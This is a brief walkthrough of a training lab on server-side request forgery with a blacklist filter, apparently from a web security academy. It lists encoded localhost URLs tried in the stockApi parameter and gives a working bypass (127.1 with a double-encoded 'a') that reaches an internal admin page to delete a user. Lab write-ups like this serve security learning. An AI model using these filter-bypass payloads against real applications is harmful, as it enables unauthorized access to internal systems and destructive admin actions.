### Lab: SSRF with blacklist-based input filter

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

_____

Analysis and Exploit:

1. Use the 'stock check' feature at **/product/stock**
    - stockApi : http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
    - must be url encoded: http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeI
2. Try to bypass SSRF defenses: http://localhost/admin + [BURP-REPEATER] + | [BURP-HACKVETOR]
    - http%3a//localhost/admin | <@/burp_urlencode> | "External stock check blocked for security reasons" (1)
    - aHR0cDovL2xvY2FsaG9zdC9hZG1pbg | <@/base64url> | "Missing parameter" (2)
    - %68%74%74%70%3A%2F%2F%6C%6F%63%61%6C%68%6F%73%74%2F%61%64%6D%69%6E | <@/urlencode_all> | (1)
    - http%3A%2F%2Flocalhost%2Fadmin | <@/urlencode> | (1)
    - http%253A%252F%252Flocalhost%252Fadmin | <@/urlencode>x2 | (1)
    - http://127.1/%25%36%31dmin | 'a' <@/urlencode_all>x2 | OK
3. Delete user _carlos_ **/%25%36%31dmin/delete?username=carlos**

_____

Script:

1. Delete user carlos | POST **/product/stock** | params: stockApi
    - stockApi : http://127.1/%25%36%31dmin/delete?username=carlos
    - check if deletion is successful

